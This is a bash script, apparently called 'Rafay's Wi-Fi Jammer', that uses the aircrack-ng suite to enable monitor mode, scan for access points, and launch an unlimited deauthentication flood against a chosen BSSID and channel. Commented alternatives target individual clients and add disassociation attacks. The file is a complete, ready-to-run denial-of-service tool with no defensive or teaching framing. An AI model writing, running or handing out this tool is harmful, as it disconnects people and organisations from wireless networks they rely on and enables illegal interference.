#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  echo "Needs root"
  exit 1
fi

INTERFACE="wlan0"

show_menu() {
    clear
    cat << "MENU"
 ____        __                 _      __        ___ _____ _    
|  _ \ __ _ / _| __ _ _   _ ___( )___  \ \      / (_)  ___(_)   
| |_) / _` | |_ / _` | | | / __|// __|  \ \ /\ / /| | |_  | |   
|  _ < (_| |  _| (_| | |_| \__ \  \__ \   \ V  V / | |  _| | |   
|_| \_\__,_|_|  \__,_|\__, |___/  |___/    \_/\_/  |_|_|   |_|   
                      |___/                                       

 | | __ _ _ __ ___  _ __ ___   ___ _ __  
_    | |/ _` | '_ ` _ \| '_ ` _ \ / _ \ '__| 
| |_ | | (_| | | | | | | | | | | |  __/ |    
\___/ \__,_|_| |_| |_|_| |_| |_|\___|_|

MENU
    
    echo ""
    echo "1) Start Wi-Fi Jammer"
    echo "2) Exit"
    echo "================================"
}

cleanup() {
    echo ""
    echo "[*] Cleaning up and exiting. Stay safe, LO."
    
    # Kill any running aireplay-ng processes
    pkill -f aireplay-ng 2>/dev/null
    
    # Stop monitor mode
    if [ -n "$MON_IFACE" ]; then
        echo "[*] Stopping monitor mode on $MON_IFACE..."
        airmon-ng stop "$MON_IFACE" 2>/dev/null || iw dev "$MON_IFACE" del 2>/dev/null
    fi
    
    # Bring wlan0 back up and reconnect
    echo "[*] Restarting network..."
    ip link set "$INTERFACE" up 2>/dev/null
    systemctl restart NetworkManager 2>/dev/null || systemctl restart networking 2>/dev/null
    
    echo "[✓] Cleanup complete"
}

trap cleanup EXIT

while true; do
    show_menu
    read -p "Select an option [1-2]: " choice
    
    case $choice in
        1)
            echo "[*] Preparing environment..."
            
            # Disconnect from network first
            echo "[*] Disconnecting from network..."
            nmcli device disconnect "$INTERFACE" 2>/dev/null
            sleep 1
            
            # Kill interfering processes
            echo "[*] Killing conflicting processes..."
            airmon-ng check kill 2>/dev/null
            sleep 1
            
            # Start monitor mode
            echo "[*] Starting monitor mode on $INTERFACE..."
            airmon-ng start "$INTERFACE" 2>&1 | grep -i "monitor\|enabled"
            
            # Find the monitor interface
            MON_IFACE=$(ip link show | grep -E "mon|wlan.*mon" | awk '{print $2}' | sed 's/:$//' | head -1)
            
            if [ -z "$MON_IFACE" ]; then
                echo "[!] Failed to create monitor interface. Trying manual method..."
                MON_IFACE="${INTERFACE}mon"
                iw dev "$INTERFACE" interface add "$MON_IFACE" type monitor 2>/dev/null
                ip link set "$MON_IFACE" up 2>/dev/null
            fi
            
            # Verify monitor interface exists
            if ! ip link show "$MON_IFACE" &>/dev/null; then
                echo "[!] Monitor interface $MON_IFACE still doesn't exist"
                echo "[!] Available interfaces:"
                ip link show | grep "^[0-9]" | awk '{print $2}' | sed 's/:$//'
                sleep 2
                continue
            fi
            
            echo "[✓] Monitor interface: $MON_IFACE"
            echo ""
            echo "[*] Scanning... (Hit Ctrl+C to stop)"
            echo ""
            
            # Scan for targets
            airodump-ng "$MON_IFACE" 2>/dev/null
            
            echo ""
            read -p "Enter Target BSSID: " BSSID
            read -p "Enter Channel: " CH
            
            if [ -z "$BSSID" ] || [ -z "$CH" ]; then
                echo "[!] BSSID and Channel cannot be empty"
                sleep 2
                continue
            fi
            
            # Validate BSSID format (XX:XX:XX:XX:XX:XX)
            if ! [[ "$BSSID" =~ ^([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})$ ]]; then
                echo "[!] Invalid BSSID format. Use XX:XX:XX:XX:XX:XX"
                sleep 2
                continue
            fi
            
            echo "[*] Setting channel $CH..."
            iwconfig "$MON_IFACE" channel "$CH" 2>/dev/null
            
            echo "[*] Jamming active on $BSSID on channel $CH..."
            echo "[*] Press Ctrl+C to stop"
            echo ""
            
            # ===== JAMMER LOGIC - CHOOSE ONE =====
            
            # Option 1: Basic deauth (infinite packets)
            aireplay-ng --deauth 0 -a "$BSSID" "$MON_IFACE"
            
            # Option 2: Deauth with rate limiting (uncomment to use)
            # timeout 300 aireplay-ng --deauth 100 -a "$BSSID" "$MON_IFACE"
            
            # Option 3: Target specific client (uncomment to use)
            # read -p "Enter Client MAC (leave blank for broadcast): " CLIENT_MAC
            # if [ -n "$CLIENT_MAC" ]; then
            #     aireplay-ng --deauth 0 -a "$BSSID" -c "$CLIENT_MAC" "$MON_IFACE"
            # else
            #     aireplay-ng --deauth 0 -a "$BSSID" "$MON_IFACE"
            # fi
            
            # Option 4: Combo deauth + disassoc (uncomment to use)
            # aireplay-ng --deauth 0 -a "$BSSID" "$MON_IFACE" &
            # DEAUTH_PID=$!
            # sleep 2
            # aireplay-ng --disassociate 0 -a "$BSSID" "$MON_IFACE"
            # wait $DEAUTH_PID
            
            # ===== END JAMMER LOGIC =====
            ;;
        2)
            exit 0
            ;;
        *)
            echo "Invalid option"
            sleep 1
            ;;
    esac
done
